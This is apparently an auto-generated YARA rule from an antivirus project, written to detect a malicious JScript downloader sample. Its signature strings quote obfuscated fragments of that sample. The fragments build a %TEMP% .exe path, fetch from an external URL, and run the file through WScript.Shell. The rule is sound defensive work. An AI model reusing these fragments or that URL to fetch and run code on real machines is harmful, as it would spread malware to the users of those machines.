rule sig_20160328_82da7ea8f0bf005a04d5027c78dcb646 {
  meta:
    description = "datamaliciousorder - file 20160328_82da7ea8f0bf005a04d5027c78dcb646.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "346bf5af9bbdac1a3378613aa4013961900db29ba3aa70d8dc71eaa3af88cb9c"

  strings:
    $s1  = "function Rppkmkqh() {return Jqnnhzu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9mu4LPXWQKor.exe\";};" fullword ascii
    $s2  = "Oflfzr[Qtjzyjgval](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Kkoungpb](Taatixdmxi() * 11)} while (Oflfzr[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Jqnnhzu = function Lycbqhzx() {return WScript[Onmkm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Jnkpbvlzs(Vpyoobtat, Phwtgp){return Vpyoobtat - Phwtgp;};" fullword ascii
    $s6  = "function Ljwrcnbi(Oteipztagz){Jqnnhzu[\"Run\"](Oteipztagz, Boxilg, Boxilg);};" fullword ascii
    $s7  = "function Aohwth() {return ((Bnofdpngi == true) && (Bnofdpngi == Ifftw)) ? 1 : Boxilg;};" fullword ascii
    $s8  = "function Bwbaj()" fullword ascii
    $s9  = "var Vygxqvlnw = new this[\"Date\"]();" fullword ascii
    $s10 = "function Taatixdmxi(){return 22;};" fullword ascii
    $s11 = " while (Wcsgfzvhw){" fullword ascii
    $s12 = "var Bnofdpngi = false;" fullword ascii
    $s13 = "function Vuinkv(){return Itbtflh;};" fullword ascii
    $s14 = "Ifftw = true; " fullword ascii
    $s15 = "function Gnexl(Nqphvl) {var Ykoczsgeci = (1, 2, 3, 4, 5, Nqphvl); return Ykoczsgeci;};" fullword ascii
    $s16 = "var Ifftw = false;" fullword ascii
    $s17 = "var Spjjpgznwt = false;" fullword ascii
    $s18 = "return Jnkpbvlzs(Fxrvsbabd, Nvyqaifbzy);" fullword ascii
    $s19 = "function Onjsiquemk(){return Onmkm;};" fullword ascii
    $s20 = "Bnofdpngi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}